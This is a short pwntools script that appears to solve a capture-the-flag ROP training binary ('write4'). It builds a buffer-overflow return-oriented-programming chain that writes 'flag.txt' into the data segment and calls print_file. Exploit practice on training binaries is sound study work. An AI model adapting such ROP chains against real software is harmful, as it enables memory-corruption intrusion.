from pwn import *

context.arch = 'amd64'
p = process("./write4", stdin=PTY)
elf = ELF("./write4")
rop = ROP("./write4")

padding = cyclic(40)

data_segment = p64(0x601028) # view in symbols ==> readelf -s write4
flag_string = b"flag.txt"

pop_r14_pop_r15 = p64((rop.find_gadget(["pop r14", "pop r15", "ret"]))[0]) # to setup data addr & flag.txt in registers
mov_ptr_r14_r15 = p64(0x400628) # mov qword ptr [r14], r15 ; ret ==> to move flag.txt in data segment

pop_rdi = p64((rop.find_gadget(["pop rdi", "ret"]))[0]) # to set an argument at print_file()
print_file = p64(elf.symbols['print_file'])

pld = padding
pld += pop_r14_pop_r15
pld += data_segment
pld += flag_string
pld += mov_ptr_r14_r15
pld += pop_rdi
pld += data_segment
pld += print_file

p.sendline(pld)
p.interactive()